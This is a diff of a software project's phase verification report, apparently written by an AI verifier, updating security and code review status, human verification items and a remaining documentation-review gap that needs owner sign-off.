+- `04-SECURITY.md`: `threats_open: 0` (T-04-14 medium, open below the threshold). `04-VALIDATION.md`: 0 gaps.
 
-### Code review, security, Nyquist
+### Human verification
 
-- `04-REVIEW-DISPOSITION.md`: 5 critical fixed; 32 warnings fixed, 9 deferred (targets in `deferred-items.md`), 1 skipped; 27 info open; 0 critical or warning open.
-- `04-REVIEW-GAPS.md` (incremental review of the gap changes): 1 critical, 7 warnings, 5 info, none triaged. GCR-01 is weighed above. GWR-01 to GWR-03 were reproduced here. GWR-04 to GWR-07 were not run.
-- `04-SECURITY.md`: `threats_open: 0` at the `high` threshold, 1 open below it (T-04-14), AR-04-04 accepted by the owner for T-04-116. `04-VALIDATION.md`: `nyquist_compliant: true`.
-- UI review: not applicable (no frontend).
-
-### Human verification required
-
-1. GCR-01 owner decision: fix the approval prompt or accept the residual. See the section above.
-2. Triage of `04-REVIEW-GAPS.md` (GCR-01, GWR-01 to GWR-07, GIN-01 to GIN-05).
-3. AC-8 spot-check of runs T01-B, T04-C and T05-A (a person judges that each diff solves its task).
-4. Node 22.22.3 test leg (not runnable here).
-5. Decision on the committed `04-36-evidence/` before the phase PR is pushed to the public origin.
+None new. The five human items of the previous report are resolved (UAT gaps closed, or owner-decided).
 
 ### Gaps summary
 
-No must-have failed. Both earlier gaps are closed (SC2 by the recorded owner decision ADR-016, SC3 by the classifier and binding fixes, which I reproduced), the SC6 override is superseded, and 6 of 6 success criteria hold. The verdict is `human_needed` because five items need a person: the untriaged critical GCR-01 (an approval prompt that hides what it binds), the untriaged review file, the AC-8 spot-check, the Node 22 leg and the public-origin evidence decision. If the owner rules GCR-01 must be fixed, convert it to a gap and plan it with `/gsd-plan-phase --gaps`.
+One gap blocks completion: SC6's fresh-eyes review. Everything in the code goal holds. To close it: apply the four WARNING fixes from `04-69-reviews/README.md`, have the owner authorize a scoped round 4 for group A (`policy-and-approvals.md`, `containment.md`, `cli-reference.md`, `data-model.md`, `processes.md` and the diagram) and group B (`profiles-and-credentials.md`, `runs.md`, `integrations.md`, `indexes-and-context.md`, `README.md`), and update `coverage.md` on a pass. Two cheap adjacent fixes the review already specifies (WR-01 README text, WR-02 `HAS_CONTROL` set plus a test) are not blockers and may be done in the same pass, but WR-02 changes `src` and would need the full-suite legs rerun or a narrower owner-accepted check. If the owner prefers to ship with the review unmet, record an `overrides:` entry for SC6; I would not apply one without the owner's name and reason.
 
 ---
 
-_Verified: 2026-11-23_
+_Verified: 2026-11-25_
 _Verifier: Claude (gsd-verifier)_
